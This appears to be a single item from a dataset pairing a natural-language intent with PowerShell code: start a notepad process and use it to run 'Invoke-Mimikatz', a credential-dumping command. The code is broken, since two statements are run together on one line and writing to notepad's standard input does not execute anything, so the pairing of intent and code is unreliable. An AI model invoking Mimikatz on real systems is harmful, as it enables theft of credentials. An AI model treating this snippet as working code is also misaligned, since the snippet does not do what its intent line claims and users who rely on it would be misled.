# Natural language intent:
# Start a notepad process, pass it through, and use it to run the Mimikatz command.

$process = Start-Process notepad.exe -PassThru $process.StandardInput.WriteLine('Invoke-Mimikatz')
